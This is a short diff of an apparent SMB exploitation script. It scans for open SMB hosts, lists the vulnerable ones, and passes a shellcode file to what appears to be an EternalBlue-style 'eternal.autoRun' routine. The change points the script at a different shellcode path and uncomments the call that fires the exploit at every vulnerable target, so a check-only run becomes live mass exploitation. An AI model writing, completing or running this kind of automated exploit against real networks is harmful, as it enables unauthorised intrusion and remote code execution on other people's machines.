@@ -48,7 +48,7 @@ def threading(ip):
 
 def exploit(targets):
     for i in targets:
-        eternal.autoRun(i,"sc_x86.bin")
+        eternal.autoRun(i,"shellcode/shellcode.bin")
 
 def check(open_smb):
     vulnerable_smb = []
@@ -81,4 +81,4 @@ if __name__ == '__main__':
     	threading(ip)
     targets = check(TargetList)
     print('[*] Vulnerable targets: {}'.format(targets))
-    #exploit(targets)
+    exploit(targets)
